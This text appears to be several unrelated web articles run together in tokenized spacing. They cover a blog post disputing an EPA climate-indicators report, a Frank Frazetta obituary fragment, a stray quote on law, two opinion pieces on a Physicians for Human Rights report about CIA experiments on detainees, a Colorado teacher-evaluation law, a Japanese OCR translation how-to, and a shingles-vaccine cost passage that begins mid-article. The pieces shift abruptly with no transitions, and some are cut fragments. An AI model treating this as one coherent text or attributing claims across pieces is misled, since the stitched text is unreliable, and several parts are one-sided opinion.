The indicators in this report present clear evidence that the composition of the atmosphere is being altered as a result of human activities and that the climate is changing .
They also illustrate a number of effects on society and ecosystems related to these changes .
Now , that particular statement is very carefully crafted .
It is very painstakingly worded so that no one can say that they claimed the changes in climate are caused by the changes in the “ composition of the atmosphere ” … but heck , if you mistakenly were to assume that , the EPA wo n’t get in your way .
In other words , CO2 is rising and climate is changing … stunning news .
But that ’s just the start .
The individual parts of the report are marked by plain old bad science .
Here ’s one example among many .
This is the record of “ heat waves ” , which they define as follows :
While there is no universal definition of a heat wave , this indicator defines a heat wave as a four - day period with an average temperature that would only be expected to occur once every 10 years , based on the historical record .
This indicator reviews trends in the U.S. Annual Heat Wave Index between 1895 and 2008 .
This index tracks the frequency of heat waves across the lower 48 states , but not the intensity of these episodes .
The index uses daily maximum temperature data from the National Oceanic and Atmospheric Administration , which keeps records from weather stations throughout the nation .
Approximately 300 to 400 stations reported data from 1895 to 1910 ; over the last 100 years , the number of stations has risen to 700 or more .
The index value for a given year could mean several different things .
For example , an index value of 0.2 in any given year could mean that 20 percent of the recording stations experienced one heat wave ; 10 percent of stations experienced two heat waves ; or some other combination of stations and episodes resulted in this value .
Sadly , although they say they use NOAA data , they do n’t say where the data that they used is located .
Well , no , actually that ’s not quite true .
They say :
The data for this indicator are based on measurements from the National Oceanic and Atmospheric Administration ’s National Weather Service Cooperative Observer Network .
These weather station data are available online at : www.nws.noaa.gov/os/coop/what-is-coop.html.
Unfortunately , when you go to that URL , there ’s no data .
There ’s just a description of the Cooperative Station Program entitled “ What is the Coop Program ? ” … but I digress …
Regarding heat waves , they say :
The frequency of heat waves in the United States decreased in the 1960s and 1970s , but has risen steadily since then .
The percentage of the United States experiencing heat waves has also increased .
The most severe heat waves in U.S. history remain those that occurred during the “ Dust Bowl ” in the 1930s , although average temperatures have increased since then .
Having said that , Figure 2 shows their data for the Heat Wave Index , the linear trend over the entire period , and the change in atmospheric CO2 during the period .
Figure 2 . “ Heat Wave Index ” ( yellow line ) and CO2 level ( red line , right scale ) .
Orange line is the linear trend for the entire period .
You ’d think that the only reasonable conclusions from this chart would be that heat waves and CO2 are not related in the slightest , that there is no overall change in the US Heat Wave Index , and that there appears to have been a step change in the data in 1980 … but this being the EPA , you ’d be wrong .
This is all part of the ‘ CO2 is rising and climate is changing ’ mantra .
And you would also think that they would give us drought information to go with this .
For example , I showed the change ( or rather the lack of change ) in the Palmer Drought Severity Index from 1895 to 2009 in my post “ Come Rain or Come Shine “ .
But strangely , rather than report that drought is no more common now than a hundred years ago , they say :
During the 20th century , many indices were created to measure drought severity by looking at trends in precipitation , soil moisture , stream flow , vegetation health , and other variables .
This indicator is based on the U.S. Drought Monitor , which integrates several of these indices .
Why is the U.S. Drought Monitor a strange choice for their analysis ?
Well , because that particular drought indicator only contains data that goes all the way back to … 2000 .
Not even one decade of data .
And of course , their conclusion is :
Because data from the U.S. Drought Monitor are only available for the most recent decade , there is no clear long - term trend in this indicator .
Well , duh … the USHCN maintains several long - term drought indicators which cover the period 1895 – present , so the EPA chose to only report on an indicator with a nine - year record , and then explains that the record is too short to show a trend .
I could give you many more examples , but my stomach wo n’t take it .
This is the US EPA , however , so I suppose I should n’t be surprised .
My tax dollars at work …

Frank Frazetta , an illustrator of comic books , movie posters and paperback book covers whose visions of musclebound men fighting with swords and axes to defend scantily dressed women helped define fantasy heroes like Conan , Tarzan and John Carter of Mars , died on Monday in Fort Myers , Fla .
He was 82 .
The cause was complications from a stroke , said Rob Pistella and Stephen Ferzoco , Mr. Frazetta ’s business managers .
Mr. Frazetta was a versatile and prolific comic book artist who , in the 1940s and ’ 50s , drew for comic strips like Al Capp ’s “ Lil’ Abner ” and comic books like “ Famous Funnies , ” for which he contributed a series of covers depicting the futuristic adventurer Buck Rogers .

A satirical advertisement Mr. Frazetta drew for Mad earned him his first Hollywood job , the movie poster for “ What ’s New Pussycat ? ” ( 1965 ) , a sex farce written by Woody Allen that starred Peter Sellers .
In 1983 he collaborated with the director Ralph Bakshi to produce the animated film “ Fire and Ice . ”
" Law must apply to everyone equally or it's not law at all .
Those who are pushing the other view have a misguided idea of what law is all about . "

Physicians for Human Rights ( PHR ) released today the results of a landmark investigation that , according to the organization 's press release , " uncovered evidence that indicates the Bush administration apparently conducted illegal and unethical human experimentation and research on detainees in CIA custody . "
PHR is asking President Obama to " order the attorney general to undertake an immediate criminal investigation of alleged illegal human experimentation and research on detainees conducted by the CIA and other government agencies following the attacks on Sept. 11 , 2001 . "
They are also seeking other investigations by Congress , the Department of Health and Human Services , and the Department of Justice .
As PHR's White Paper -- " Experiments in Torture : Evidence of Human Subject Research and Experimentation in the ' Enhanced ' Interrogation Program " ( PDF ) -- makes clear , illegal experimentation upon human subjects was an integral part of the Bush / Cheney / CIA " enhanced interrogation " program ( EIP ) from the very beginning .
Medical and psychologist monitors were used to collect and analyze data from the EIP interrogations in order " to derive generalizable inferences to be applied to subsequent interrogations . "
The use of illegal experimentation both reveals the actual parameters of the torture program , and raises the stakes surrounding the need for accountability for these actions to a new level .
According to PHR's White Paper :
Such acts may be seen as the conduct of research and experimentation by health professionals on prisoners , which could violate accepted standards of medical ethics , as well as domestic and international law .
These practices could , in some cases , constitute war crimes and crimes against humanity .
The charges are expected to resonate throughout the legal , human rights and religious communities .
The executive director of the National Religious Campaign Against Torture ( NRCAT ) , Rev Richard Killmer , commenting in a press release on PHR 's report , said he deplored the " deeply disturbing evidence that our government committed , in our names , forced human experimentation that recalls some of humanity 's darkest days — charges from which no person of faith can afford to turn away . "
( NRCAT has also released a new video today , " Accounting for Torture . " )
Research Violated U.S. and International Law
PHR's CEO Frank Donaghue states , " The CIA appears to have broken all accepted legal and ethical standards put in place since the Second World War to protect prisoners from being the subjects of experimentation . "
PHR examined three instances of the CIA 's illegal medical research , although it should be understood this most likely does not constitute the full extent of the torture research program .
Some of the experiments concerned the elaboration of more extensive forms of waterboarding , testing the use of large - volumes of water , the use of saline solution as a substitute for plain water , as well as the use of ancillary equipment , such as a gurney that could swing the prisoner into different angles , and use of a blood oximeter to measure subject vital signs and calibrate them with experimental techniques .
The CIA also experimented on different levels of sleep deprivation in order to assess effects and coordinate practice with legal definitions constructed by the Office of Legal Counsel ( OLC ) .
In one gruesome set of experiments , at least 25 detainees were submitted to both individual and combined use of the different " enhanced interrogation " techniques developed by the CIA through reverse - engineering of the military 's Survival , Evasion , Resistance , Escape ( SERE ) program , techniques which were originally developed to inoculate U.S. military personnel against torture .
The purpose of this experiment , monitored by doctors , was to ascertain the effects of the different combinations of techniques as they pertained to " susceptibility to severe pain , " attempting thereby to calibrate levels of pain in order to keep the interrogations within the dubious frontiers of legality proposed by John Yoo and Jay Bybee in their infamous torture memos .
The purpose of this experimental program was apparently to help provide legal cover for the torture program , as well as both examine the effects of torture upon live subjects , and further the design of the torture program itself .
No existing research protocol has come to light , and the evidence has been organized via the use of open source documents and FOIA releases .
From these sources , one can see that the use of medical monitors and experimental medical data was used as supposed " good faith " evidence against possible prosecution for torture .
A Legal Limbo
The actions of the Bush Administration to legally justify their torture program via the use of executive orders and OLC rulings has been well - documented .
Only last February , the Department of Justice 's Office of Professional Conduct released their finding that the actions of Yoo and Bybee in constructing the 2002 memos that authorized torture did not amount to unprofessional or unethical conduct , but simply constituted " bad judgment . "
Whatever the judgment upon the OLC memos , it is apparent the use of torture pre-dated the OLC approval of the EIP .
While there is some evidence that the Bush administration was concerned with loosening the legal parameters surrounding research using human subjects ( story to come ) , there is no evidence , as PHR's White Paper points out , that OLC ever considered the legality of the medical monitoring of prisoners as part of the CIA torture program .
According to Director of PHR ’s Campaign Against Torture and lead report author , Nathaniel A. Raymond , " Justice Department lawyers appear to have never assessed the lawfulness of the alleged research on detainees in CIA custody , despite how essential it appears to have been to their legal cover for torture . "
But , after a number of Supreme Court decisions , culminating in the Hamdan v Rumsfeld ruling in June 2006 , the government apparently had second thoughts about its legal liabilities .
One of the most original pieces of research in the PHR report concerns the rewriting of the War Crimes Act ( WCA ) as part of the 2006 Military Commissions Act ( MCA ) .
Concerned , it would seem , over their vulnerability to criminal prosecution for illegal and unethical research conducted upon detainees , including , as I 've pointed out before , Abu Zubaydah , the Bush administration amended the WCA language in the MCA to weaken the protections against the strict prohibitions against scientific experiments on prisoners found in the Geneva Conventions .
These changes were then made retroactive to 1997 , which suggests the U.S. government was shielding interrogators and other officials for illegal acts going back four years prior to 9/11 .
And to their shame , Congress passed this legislation , and the language on the WCA was then retained by the Democratic Party - controlled Congress when the MCA was amended in 2009 .
One of PHR 's recommendations in their report is that Congress undertake a revision of the War Crimes Act " to eliminate changes made to the Act in 2006 which weaken the prohibition on biological experimentation on detainees , and ensure that the War Crimes Act definition of the grave breach of biological experimentation is consistent with the definition of that crime under the Geneva Conventions . "
Outstanding Issues To Be Resolved
It has been some years since the experimental aspects of the torture program were first recognized .
The breach of medical ethics by doctors was first discussed by M. Gregg Bloche and Jonathan H. Marks in the New England Journal of Medicine in January 2005 .
In July 2005 , a New Yorker article by Jane Mayer , " The Experiment , " looked at the " reverse - engineering " of the SERE techniques , and noted both the prohibition on scientific experiments of prisoners in Geneva , and the " [ n] umerous experiments aimed at documenting trainees ’ stress levels ... conducted by sere - affiliated scientists . "
One of the authors of the PHR report , Stephen Soldz , wrote about the experimental aspects of " behavioral science - based torture techniques " in use at Guantanamo in a August 2006 article .
In 2007 , physician Steven Miles noted the experimental aspects of the Al Qahtani interrogation at Guantanamo in late 2002 - early 2003 .
The experimental aspect of the interrogation of Abu Zubaydah was broached by FBI agent Ali Soufan in testimony before the Senate Judiciary Committee in May 2009 .
Soufan 's presence at the Zubaydah interrogation in April - May 2002 led him to characterize a CIA contractor 's treatment of Zubaydah as an experiment ( " Once again the contractor insisted on stepping up the notches of his experiment ... " ) .
The contractor is believed to have been former SERE psychologist , James Mitchell .
The PHR report should not be seen as a full history of the torture - experimentation program , but is a blueprint offering the outlines of what that program consisted of and how it progressed .
For instance , except for Khalid Sheik Mohammed , none of the CIA prisoners are named in the report , although it is noted that " the authorized policy of using multiple [ " enhanced interrogation " techniques ] simultaneously was officially based on medical observations of 25 detainees . "
A full understanding of all that happened awaits future investigations .
A more comprehensive understanding of the issues raised , e.g. , the development of the waterboarding and sleep deprivation techniques , has been investigated by Marcy Wheeler at Emptywheel / Firedoglake , while the torture of Abu Zubaydah has been intensively covered by Jason Leopold at Truthout .
Leopold noted the " extensive back - and - forth between CIA field operatives and agency officials " on matters such as " medical updates " and " behavioral comments . "
In an article last April , I noted that " psychologist 's notes " had been cataloged as a part of Abu Zubaydah 's interrogation materials .
Such notes would indicate just what variables of interest were being recorded by the psychological experimenter , especially given recent revelations in a story by Jason Leopold that a second taping system was used in the interrogation of Zubaydah , with " torture sessions that were stored on computers and separate hard drives . "
Variables of interest to CIA psychologists might include head movements and hand movements , facial expressions or microexpressions , used in detecting deception or behavioral manifestations of stress .
These types of observation are synonymous with computer analysis and argue for the use of a digital video system or the transfer of analog video into data stored on magnetic or optical media .
The same release of documents ... also described CIA officials asking for " instructions " regarding the " disposition of hard drives and magnetic media " associated with the torture of Zubaydah .
Among the various threads left dangling from the PHR investigation , none concerns me more than the links between the SERE research undertaken by investigators led by Dr. Charles A. Morgan and the CIA experimental torture program , as reported in an appendix to PHR 's report .
In an appendix to their report , PHR describes the SERE research undertaken during the years prior to the issuance of the OLC memos , and explains that the results of that research demonstrated how the risk of harm was inherent in the SERE techniques .
In addition , they note , " the experimental framework of these studies intentionally or unintentionally laid the groundwork for unethical and illegal human experimentation that would follow . "
The full details of my own investigation into those links were published back in September 2009 .
What is indisputable is that by virtue of his position , Dr. Morgan had access to CIA officials just at the time that another department of the CIA , one to which he is affiliated , was , according to the CIA ’s own Office of Inspector General Report ( large PDF ) involved in vetting the SERE techniques for use in interrogations .... ... it looks like the CIA used DOD / JPRA as a cover for the safety of techniques that it knew were in fact harmful from their own analysis of the " data . "
[ JRPA , or Joint Recovery Personnel Agency is , among other things , the " Executive Agency " for the SERE training schools . ]
One especially lingering thread concerns the assertion in the PHR report that all of Dr. Morgan 's SERE research had been properly vetted by Institutional Research Boards .
While this is true for his published research , a report for which Dr. Morgan is listed as second author , The War Fighter 's Stress Response : Telemetric and Noninvasive Assessment , conducted on behalf of the U.S. Army Medical Research and Materiel Command at Ft. Detrick , beginning approximately in November 2001 , states -- even by its final addendum in October 2003 -- that " due to Institutional Review Board delays no human subjects data are available . "
The exact interactions between CIA and DoD / JPRA , between the White House and both DoD and CIA , the role of other actors , such as the Defense Intelligence Agency and Joint Special Operations Command , not to mention the actual origins of the torture research program , remain unclear .
It is a vital necessity that that investigations take place , and hopefully PHR 's report will provide the added impetus to push this issue to the forefront of a tired , confused , and frightened country , a country misled in so many ways over the past decade , and now forced to confront the full panoply of evil that has resulted from having a portion of the government held apart from public scrutiny .
That must end now .

A landmark Colorado law that ties teacher evaluations to the progress of their students on achievement tests could help build momentum for a national movement that seeks to overhaul how instructors ’ tenure and pay is earned , education leaders say .
Colorado ’s law will hold teachers accountable for whether their students are learning , with 50 % of a teacher ’s evaluation based on students ’ academic growth as measured partially by test scores .
In California , Gov. Arnold Schwarzenegger is pushing legislation that will change the way teachers are evaluated , but its prospects are less certain ; the state ’s teachers union strongly opposes it .
Colorado ’s action comes amid a national debate over how to get the best teachers into the classroom and remove the ones who are n’t doing a good job .
Similar legislation emphasizing teacher performance over job security is pending in Louisiana and Minnesota , and bills overhauling tenure protections and / or evaluation systems have already passed in Maryland , Connecticut , Washington , Tennessee and Michigan .
“ It ’s impossible to overstate just how significant this [ Colorado ] bill is , ” said Tim Daly , president of the New Teacher Project , a national nonprofit that released a report last year revealing how the vast majority of teacher evaluation systems fail to distinguish effective teachers from ineffective ones .
Under Colorado ’s law , passed with bipartisan support and signed by Gov. Bill Ritter Jr. on Thursday , even tenured teachers who are found to be “ ineffective ” for two consecutive years could lose job protections , and possibly their jobs .
Support from Democrats and , at the last minute , from a teachers union in Colorado represents a major political shift at a time when states are facing huge budget cuts that could mean thousands of teacher layoffs .
Colorado ’s law also reflects a wholesale change in attitudes toward evaluating teachers .
Like many states , Colorado is hoping to bolster its chances in the Race to the Top grant competition before second - round applications are due June 1 .
The program rewards states for assessing teacher effectiveness , and Colorado has $ 175 million at stake .
Approval in Colorado is a promising sign , said Bonnie Reiss , California ’s secretary of education : “ Every time our state Legislature sees another state taking leadership in this important reform area , it does increase our likelihood ” of passing the bill .
The teacher ’s union is vehemently opposed to the bill introduced by state Sen. Bob Huff ( R - Diamond Bar ) and approved by the Senate Education Committee in April .
Union leaders , who are paying for television ads urging opposition , argue that it would gut due - process rights and scapegoat teachers during bad economic times .
“ Rather than focusing on the real problems facing our schools , like larger class sizes and cuts to student programs , this bill simply blames teachers , ” the California Teachers Assn. said in a statement .
Supporters argue that performance should dictate personnel decisions .
The bill would allow schools to lay off , assign , transfer and rehire teachers and administrators based on effectiveness and subject - matter needs — a radical departure from the current seniority - based policy .
The governor ’s push for the bill comes as the cash - strapped state is also making a second attempt to win Race to the Top dollars .
In the hopes of making the state more competitive , Reiss has sent a letter urging all county and district superintendents as well as charter school administrators to adopt specific reforms , including linking teacher evaluation to student growth ; the unions are urging local affiliates not to sign on .
President Obama and U.S. Secretary of Education Arne Duncan are actively encouraging teacher evaluation and tenure reform by tying them to federal funds , another sign of the changing politics of education reform .
In Colorado , the law attracted national attention in part because it bucked a trend of Republicans leading statewide efforts to implement merit pay and tenure reform .
Democrats have largely sided with unions in opposition to these changes .
“ It may be the first time ever that Democrats pushed an agenda that opposed the agenda of the teachers unions , ” said Kate Walsh , president of the National Council on Teacher Quality .
And although teachers unions opposed the legislation in Colorado , the state chapter of the American Federation of Teachers , in an unexpected twist , endorsed it after securing several amendments that both the AFT and the Colorado Education Assn. , an affiliate of the National Education Assn. , had pushed .
“ I truly believe that we need to be leaders in education reform , ” said Brenda Smith , president of AFT Colorado .
The NEA , the nation ’s largest teachers union , remains opposed .
Teacher tenure legislation has been a challenge .
Florida Gov. Charlie Crist , a Republican , vetoed a bill that would have mandated performance pay and eliminated tenure after he was besieged by the opposition .
Delaware , one of only two states to receive money in the first round of the Race to the Top competition , has already revamped its teacher evaluation systems .
New York and New Jersey have announced plans to do the same .

If you have a Japanese document on paper there are plenty of services that will translate it for a price , but it is also possible to get a machine translation done for free .
It might not give you a great translation , but it might be good enough for you to at least work out what the document is .
There are two stages to translating a document in Japanese .
Converting an image ( i.e. a scan of the document ) into Japanese computer text .
Translating that Japanese text into English .
The WeOCR Project will allow you to convert your scan into Japanese text ( Kanji , Hiragana and Katakana ) .
A high quality scan will work best , but I ’ve had ok results as well with an image taken using a digital camera .
Go to their Japanese character recognition page to get your scanned image converted into Japanese text .
Then copy the text ( highlight it and then Ctrl - C on Windows ) , and paste it ( Ctrl - V ) into Google ’s Japanese to English translator .
And you have now done your free Japanese OCR translation !
Improving the quality of the results
As you have the raw Japanese text ( from the OCR step ) it it possible for you to manually fix any OCR errors if the text is important enough for you to spend the time doing so .
If any of the kana are wrong you can simple copy the correct ones over using Wikipedia ’s Hiragana table , or their Katakana table .
If you install the Japanese IME you ’ll easily be able to type in the kana characters , and if you enable the IME pad ( choose the Japanese keyboard , right click the icon with the red circle , and click ‘ Additional icons in the taskbar ’ ) , you ’ll be able to have a go at drawing the kana or Kanji – if you are close enough it should recognise the symbol .
If you do n’t find the Kanji drawing recognition is working , you can use an online tool to select the correct Kanji by clicking on which radicals you see in it .
Denshi Jisho works for me , or if you have an iPhone , the latest version of Kotoba has Kanji radical search built in .
You ’ll need to know a bit about how Kanji are constructed to use these tools .
Once you ’ve figured it out you can look up the Kanji relatively quickly .
When you ’ve corrected the Japanese text , you can feed it back into Google Translate and hopefully you ’ll get a better translation than before .

Nazi and imperial Japanese doctors performed horrific human experiments on unwilling subjects .
At Auschwitz and other death camps , Josef Mengele , Carl Clauberg , Herta Oberheuser , Karl Brandt , Aribert Heim and others conducted ones involving freezing temperatures , toxic chemicals and gas , sterilizations , high altitudes , radiation , electroshock , starvation , amputations , bone , muscle and nerve transplants , and numerous other atrocities called crimes of war and against humanity at Nuremberg .
At its infamous Unit 731 , Japanese doctors and scientists did their own , involving vivisections , germ and other forms of biological warfare , toxic chemicals , and other atrocities causing severe pain , disease and certain death .
Yet in 1945 , General Douglas MacArthur agreed secretly with Dr. Shiro Ishil to turn over 10,000 pages of human experimentation information in exchange for immunity from prosecution .
Justice for their victims was denied .
Today and since the early 1950s , CIA operatives conducted physically harsh and psychologically crippling mind control experiments , turning human beings into mush , a topic this writer addressed earlier , accessed through this link :
In addition , for decades , CIA and other US agencies experimented illegally with human subjects , including : in 1931 , Dr. Cornelius Rhoads conducted radiation and cancer cell injection experiments ;
in 1932 , Tuskegee Syphilis Study doctors infected 200 black men with the disease , followed their progression , and let them die untreated ;
in 1940 , 400 Chicago prisoners were infected with malaria to test experimental drugs ;
numerous human radiation experiments have been conducted on unwitting subjects ;
VA hospital patients were used as human guinea pigs ;
chemical and biological agents were released in US cities , and other similar experiments were conducted ;
US military personnel have been given experimental vaccines and other drugs , known to be toxic ;
numerous experiments with human subjects tested mustard and nerve gas , ionizing radiation , psychochemicals , hallucinogens , and other dangerous substances ;
others injected radiation into newborns , placed mentally ill patients in giant refrigerators , infected children with hepatitis , performed surgeries without anesthesia , subjected prisoners to plague , infected them with cholera , injected soldiers with plutonium ( the most toxic known substance ) as part of the Manhattan Project , used children , prisoners , and the mentally ill for ghastly experiments ; and
at US torture prisons , horrific tortures and illegal medical experiments continue being used on unwilling subjects .
New Physicians for Human Rights Report Founded in 1986 , Physicians for Human Rights ( PHR ) " mobilizes health professionals to advance health , dignity , and justice and promotes the right to health for all .
( It also ) investigates human rights abuses and works to stop them " in conflict zones , US prisons , and offshore detention facilities where torture is routinely practiced .
Its newly released report , " Experiments in Torture : Evidence of Human Subject Research and Experimentation in the ' Enhanced ' Interrogation Program " examines Bush administration practices post - 9/11 , saying :
In its aftermath , new " human intelligence collection programs " were initiated , using " an unknown number of people suspected of having links to terrorist organizations . "
Most all accusations were bogus , yet detainees were subjected to horrific waterboarding , forced nudity , sleep deprivation , temperature extremes , stress positions , prolonged isolation , and other horrific abuses , regarded as illegal under international and US law at all times , under all conditions , with no allowed exceptions .
Nonetheless , Bush administration officials claimed procedures used were " safe , legal and effective " enhanced interrogation techniques ( EITs ) .
Department of Justice ( DOJ ) Office of Legal Counsel ( OLC ) lawyers redefined practices " by establishing legal ( torture ) thresholds .... which required medical monitoring ( to ensure ones ) for severe physical and mental pain " were n't crossed .... "
In other words , medical professionals participated in illegal torture experiments by monitoring , collecting and analyzing results , to be used in subsequent interrogations , in violation of unequivocal US and international law , including Geneva 's Common Article 3 prohibiting : " violence to life and person , in particular murder of all kinds , mutilation , cruel treatment and torture :
outrages of personal dignity , in particular humiliating and degrading treatment ; "
carrying out sentences or executions " without previous judgment pronounced by a regularly constituted court affording all the judicial guarantees which are recognized as indispensable by civilized peoples ; " and
caring for the wounded and sick , including by an impartial body like the ICRC " offer ( ing ) its services to the Parties to the conflict . "
Condoning or participating in torture grievously breaches medical ethics and the 1975 World Medical Association ( WMA ) Declaration of Tokyo " Guidelines for Physicians Concerning Torture and other Cruel , Inhuman or Degrading Treatment or Punishment in Relation to Detention and Imprisonment , " stating : in all cases , at all times , " physician (s ) shall not countenance , condone or participate in " torture or any other forms of abuse ;
they " shall not use nor allow ( their ) medical knowledge or skills , or health information " to be used to aid interrogations in any way ;
they " shall not be present during any procedure during which torture or any other forms of cruel , inhuman or degrading treatment ( are ) used or threatened ; "
they " must have complete clinical independence " in treating persons for whom they 're medically responsible ; and
WMA encourages the international community and fellow physicians to support medical professionals who face " threats or reprisals resulting from a refusal to condone " all forms of torture and abuse . "
Protocol I of the Geneva Conventions states : " Persons engaged in medical activities shall neither be compelled to perform acts or to carry out work contrary to , nor be compelled to refrain from acts required by , the rules of medical ethics or other rules designed for the benefit of the wounded and sick , or this Protocol . "
PHR 's report examined three illegal and unethical medical practices : monitoring to " design , develop , and deploy ( new ) waterboarding procedures ; "
the effects of " simultaneous versus sequential " interrogation procedures to determine the " susceptibility of the subjects to severe pain ; " and
the effects of " sleep deprivation ( to establish ) enhanced interrogation .... sleep deprivation policy . "
Research purposes were to gain increased information , ostensibly assure pain levels remained within legal thresholds , and most important to provide legal cover against possible incrimination , using doctors to verify no harm was done .
PHR 's report shows health professionals were n't just complicit in torture , they also participated in research and experimentation on detainees in US custody .
In other words , human beings were ( and still are being ) used as guinea pigs .
Public documents prove it , including memoranda from the Office of Legal Counsel ( OLC ) and the CIA 's Office of Inspector General Special Review of the Agency 's Enhanced Interrogation Program .
Relevant Laws Governing Research and Experimentation , Using Human Subjects US 45 Code of Federal Regulations ( CFR ) 46.1029d ( 2005 ) defines research to mean : " .... a systematic investigation , including research development , testing and evaluation , designed to develop or contribute to generalizable knowledge .
Activities which meet this definition constitute research for purposes of this policy , whether or not they are conducted or supported under a program which is considered research for other purposes . "
The same regulation defines human subject research as : using " a living individual about whom an investigator ( whether professional or student ) conducting research obtains : 1 . data through intervention or interaction with the individual , or 2. identifiable private information . "
In all cases , subject protections , informed consent , direct benefit to the participants , and an institutional review board ( IRB ) approval are required .
Otherwise , human subject experimentation breaches the Nuremberg Code and other internationally recognized regulations and ethical guidelines .
In addition , doing so constitutes a crime of war and / or against humanity under the Rome Statute of the International Criminal Court ( ICC ) .
No information indicates that the Bush administration sought or received formal authorization for its practices .
Also , neither the CIA or DOD ever filed a waiver for informed consent , as required by federal regulations .
In addition , the CIA 's Office of Medical Services ( OMS ) made public a formal research protocol .
However , DOJ memos and other government documents reveal a classified medical monitoring program , involving " the meticulous collection and analysis of data to derive generalizable knowledge , " relating to the " safety " and effects of torture techniques .
However , under US and international law and accepted medical ethics , non-clinical human experimentation , with or without subjects ' consent , is impermissible .
" In fact , the ' enhanced ' interrogation techniques are premised on the infliction of mental ( and physical ) harm , so " experiments to make them safe and effective are legally and ethically groundless and indefensible .
Instances of Illegal and Unethical Human Subject Research and Experimentation Medical personnel involvement in waterboarding was undertaken to " disguise a universally recognized torture tactic as a ' safe , legal and effective ' interrogation " technique .
One CIA guideline directs participants to record : " .... how long each application ( and the entire procedure ) lasted , how much water was applied ( realizing that much splashes off ) , how exactly the water was applied , and if a seal was achieved , if the naso - or oropharynx was filled , what sort of volume was expelled , how long was the break between applications , and how the subject looked between each treatment . "
In his 2005 " combined techniques " memo , Principal Deputy Assistant Attorney General Steven G. Bradbury told Acting CIA General Counsel John A. Rizzo that experimentation determined that waterboarding healthy subjects , subject to defined limitations , is " medically acceptable . "
A later version , " Waterboarding 2.0 , " came after CIA developed and tested an intentionally harmful practice , using medical monitoring for cover .
Health professionals also analyzed data based on observed enhanced interrogation techniques ( EITs ) on 25 detainees , performed to determine subjects ' susceptibility to severe pain .
" This investigation had no direct clinical health care application , nor was it in the detainees ' personal interest nor part of their medical management . "
It was conducted solely to argue that the EITs in combination would n't make subjects more susceptible to pain , to justify their use .
Human Research and Experimentation Purposes PHR cited three : ( 1 ) to learn how EITs should be deployed as interrogation torture techniques designed to be " safe ( and ) effective , " or , in other words , an impossible combination .
( 2 ) to calibrate the pain level caused by techniques used to keep it from crossing the threshold defined as torture , the idea being to defend interrogators against possible crimes .
OLC lawyers defined torture as causing " long - term " mental or physical " pain and suffering , " enough to cause organ failure or death .
( 3 ) to craft legal defenses against charges of torture , arguing that medical monitoring removes the element of intent , necessary to prove to pursue successful torture prosecutions under US law .
" But in attempting to legitimize the crime of torture , the lawyers left those who authorized and performed the research open to the charge of illegal human experimentation , " as well as an unconscionable medical ethics breach .
Human Experimentation and Human Subject Protections Under George Bush , torture became official US policy , a topic this writer addressed in July 2008 , accessed through this link :
By executive orders , presidential findings , memoranda , memos , and other documents , Bush 's " doctrine of presidential prerogative " made everything permissible , supplemented by Congress enacting laws like the Military Commissions
Act - called the " torture authorization act " by exempting CIA torturers from prosecution .
The law amended the 1966 War Crimes Act ( defining them as breaches of Geneva that unequivocally prohibits torture ) , made it retroactive to 1997 , with language banning : " The act of a person who subjects , or conspires or attempts to subject , one or more persons within his custody or physical control to biological experiments without a legitimate medical or dental purpose and in so doing endangers the body or health of such person or persons . "
The new language lowered the bar on experimentation through a loophole permitting so - called " legitimate " kinds , unrelated to detainees ' well being .
Yet human subject protections are codified in US law ( 45 CFR 46.101-46.124 - 2005 ) as well as codes of professional conduct - collectively called the Common Rule , applying to all federally funded human experimentation , including CIA and DOD practices .
None may be conducted without subjects ' consent and unless safe and beneficial to their welfare .
Research and experiments amounting to torture clearly are not , and thus violate US and international law as well as established medical ethics .
Despite Obama 's January 22 , 2009 executive order prohibiting most " enhanced interrogation techniques " and his rhetoric at the time , he 's continued the most extreme Bush administration abuses , ( including so - called " safe , legal and effective " ones ) - what PHR concluded are crimes of war and against humanity .
Claiming health professionals protect detainees through systematic monitoring " is not only inherently contradictory but also a perversion of centuries of health professional ethics . "
PHR calls on the White House and Congress to investigate thoroughly and hold those involved accountable .
It also recommends restoring previous War Crimes
Act language , and urges strict policies be adopted that prohibit all forms of torture and improper treatment as well as ensuring the human rights of all those in US custody .
Final Comments Under George Bush , torture became official policy .
It remains so under Obama throughout America 's offshore gulag on US bases , ships , facilities of complicit allies , and other secret locations worldwide .
He also absolved CIA torturers from prosecution , saying he wants to look forward , not back , so will do anything to protect them and the worst of their practices , denying their victims justice like his predecessor and those before him .
It 's America 's longstanding practice - exonerate the guilty , punish the innocent , and trash the rule of law and common decency .
Obama succeeds with the best of them in upholding an unprincipled , degenerate tradition .

Although only one dose is required , the vaccination costs $ 160 to $ 195 per dose , 10 times more than other commonly prescribed adult vaccines ; and insurance carriers vary in the amount they will cover .
Thus , while the overwhelming majority of doctors in the study did not hesitate to strongly recommend immunizations against influenza and pneumonia , they could not do the same with the shingles vaccine .
“ It ’s just a shot , not a pap smear or a colonoscopy , ” said Dr. Laura P. Hurley , lead author and assistant professor of medicine at the University of Colorado in Denver .
“ But the fact is that it is an expensive burden for all patients , even those with private insurance and Medicare because it is not always fully reimbursed . ”
Moreover , many private insurers require patients to pay out of pocket first and apply for reimbursement afterward .
And because the shingles vaccine is the only vaccine more commonly given to seniors that has been treated as a prescription drug , eligible Medicare patients must also first pay out of pocket then submit the necessary paperwork in order to receive the vaccine in their doctor ’s office .
It ’s a complicated reimbursement process that stands in stark contrast to the automatic , seamless and fully covered one that Medicare has for flu and pneumonia vaccines .
Despite this payment maze , some physicians have tried to stock and administer the vaccine in their offices ; many , however , eventually stop because they can no longer afford to provide the immunizations .
“ If you have one out of 10 people who does n’t pay for the vaccine , your office loses money , ” said Dr. Allan Crimm , the managing partner of Ninth Street Internal Medicine , a primary care practice in Philadelphia .
Over time , Dr. Crimm ’s practice lost thousands of dollars on the shingles vaccine .
“ It ’s indicative of how there are perverse incentives that make it difficult to accomplish what everybody agrees should happen . ”
Even bypassing direct reimbursement is fraught with complications for doctors and patients .
A third of the physicians surveyed in the University of Colorado study resorted to “ brown bagging , ” a term more frequently used to describe insurers who have patients carry chemotherapy drugs from a cheaper supplier to their oncologists ’ offices .
In the case of the shingles vaccine , the study doctors began writing prescriptions for patients to pick up the vaccine at the pharmacy and then return to have it administered in their offices .
However , the shingles vaccine must be frozen until a few minutes before administration , and a transit time greater than 30 minutes between office and pharmacy can diminish the vaccine ’s effectiveness .
Dr. Crimm and the physicians in his office finally resorted to what another third of the physicians in the study did : they gave patients prescriptions to have the vaccine administered at pharmacies that offered immunization clinics .
But when faced with the added hassles of taking additional time off from work and making a separate trip to the pharmacy , not all patients followed through .
“ Probably about 60 percent of our patients finally did get the vaccine at the pharmacy , ” Dr. Crimm estimated .
